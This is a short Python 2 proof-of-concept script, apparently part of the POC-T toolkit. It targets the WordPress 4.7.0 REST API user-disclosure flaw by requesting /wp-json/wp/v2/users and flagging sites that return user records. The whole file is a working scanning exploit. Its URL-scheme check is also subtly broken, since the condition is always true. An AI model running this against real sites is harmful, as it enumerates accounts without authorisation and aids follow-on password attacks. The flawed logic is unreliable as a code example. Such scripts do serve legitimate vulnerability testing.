#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
WordPress 4.7 - User Information Disclosure via REST API
Ref      https://wpvulndb.com/vulnerabilities/8715
Version  WordPress == 4.7.0
"""

import requests

def poc(url):
    url = url if '://' else 'http://' + url
    payload = '/wp-json/wp/v2/users'
    url = url.rstrip('/') + payload
    try:
        r = requests.get(url)
        if r.status_code == 200 and '[{"id":1,"name":"' in r.content:
            print '[!] 存在漏洞：{} '.format(url)
            return True
    except Exception:
        pass
    return False

if __name__ == '__main__':
    poc('http://localhost/wordpress/wordpress-4.7/wordpress/')